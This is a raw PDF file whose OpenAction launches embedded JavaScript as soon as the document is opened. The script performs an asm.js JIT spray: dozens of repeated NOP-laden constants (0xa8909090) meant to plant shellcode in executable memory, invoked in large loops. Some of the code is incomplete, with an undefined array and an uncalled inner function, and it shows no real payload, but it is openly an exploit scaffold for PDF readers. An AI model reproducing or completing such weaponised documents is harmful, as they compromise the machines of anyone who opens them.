%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (
var sprayArr = [];

// store sprayed asm.js modules

var asmJsModulesArr = [];

function sprayJITShellcode(asmJsModuleName, payloadFuncName,ffix) {
	var kz = {};
	kz[ffix] = function  (){
		"use asm";
		var val =0;
		val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0xa8909090)|0;
        val = (val + 0x19b447a2)|0;
		return val|0;
	}
	return kz[ffix];
}

function z(){
	'use asm';
	for (var jitCount = 0; jitCount < 0x4800; jitCount++) {
		z();
	}
	function k(){
		z();
		for (var jitCount = 0; jitCount < 0x4800; jitCount++) {
			arr[jitCount] = sprayJITShellcode("foo"+jitCount,"payload"+jitCount,"ffi_func"+jitCount);
			arr[jitCount]();
		}
	}
}
for (var jitCount = 0; jitCount < 0x48000; jitCount++) {
	z();
	
}
app.alert(util.printf("done"));

)>> trailer <</Root 1 0 R>>
